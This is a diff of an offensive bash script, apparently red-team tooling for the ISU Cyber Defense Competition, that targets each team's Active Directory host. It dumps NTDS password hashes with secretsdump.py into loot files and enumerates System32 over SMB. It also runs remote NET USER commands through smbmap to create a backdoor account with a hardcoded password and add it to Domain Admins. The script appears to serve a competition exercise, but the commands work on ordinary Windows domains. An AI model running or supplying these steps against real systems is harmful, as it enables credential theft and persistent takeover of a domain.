@@ -19,10 +19,10 @@ while IFS=',' read -r team_number target; do
   HOST="ad.team$team_number.isucdc.com"
   
   # Output file named after the team number
-  OUTPUT_FILE="/loot/team$team_number-secretsdump.txt"
+  OUTPUT_FILE="/loot/team$team_number-ad-secretsdump.txt"
   
   # Print out the current operation for logging
-  echo "Attempting to dump NTDS from $DOMAIN at $IP_PORT, saving to $OUTPUT_FILE"
+  echo "Attempting to dump NTDS from $HOST at $IP_PORT, saving to $OUTPUT_FILE"
   
   # Run secretsdump.py to dump the domain NTDS and save output to a file
   secretsdump.py "$USERNAME:$PASSWORD@$IP_PORT" -just-dc -dc-ip "$IP_PORT" -target-domain "$DOMAIN" > "$OUTPUT_FILE" 2>&1
@@ -56,7 +56,7 @@ while IFS=',' read -r team_number target; do
       smbmap.py -H $HOST -u $USERNAME -p $PASSWORD -r 'c$/Windows/System32' --depth 1 -A '(flag|cdc)' > "$BAD_BLUE_AD_FLAG"
   fi
     
-  # Plant Red Flag 1 (Admin User File)
+  ############### Plant Red Flag 1 (Admin User File) ##################
 
   RED_FLAG_LOCATION="C$/Users/Administrator/team${team_number}_ad-cusersadministrator.flag"
   LOCAL_RED_FLAG="flags/team${team_number}/team${team_number}_ad-cusersadministrator.flag"
@@ -82,13 +82,14 @@ while IFS=',' read -r team_number target; do
 
   # NOTE: The flag needs to be truncated due to the max username size limit on Windows/AD. 12 chars is enough :)
   RED_DOMAIN_FLAG_USER=`head -c 12 flags/team${team_number}/team${team_number}_ad-domain-admin.flag`
-  DOMAIN_USER_CMD="NET USER ${RED_DOMAIN_FLAG_USER} tacocat /ADD /DOMAIN"
+  RED_DOMAIN_FLAG_PASSWD="tacocat"
+  DOMAIN_USER_CMD="NET USER ${RED_DOMAIN_FLAG_USER} ${RED_DOMAIN_FLAG_PASSWD} /ADD /DOMAIN"
   DOMAIN_ADMIN_CMD="NET LOCALGROUP \"Domain Admins\" ${RED_DOMAIN_FLAG_USER} /ADD /DOMAIN"
 
   smbmap -u $USERNAME -p $PASSWORD -d $DOMAIN -H $HOST -x "$DOMAIN_USER_CMD"
   # Check if adding the user was successful
   if [ $? -eq 0 ]; then
-      echo "Added user $RED_DOMAIN_FLAG_USER to domain!"
+      echo "Added user $RED_DOMAIN_FLAG_USER to domain with password $RED_DOMAIN_FLAG_PASSWD!"
       #TODO: Add Regex to double check that the user was added correctly.
       #TODO: Might also do another command check to 'search' for the user via SMB cmd or LDAP lookup to double check.
   else
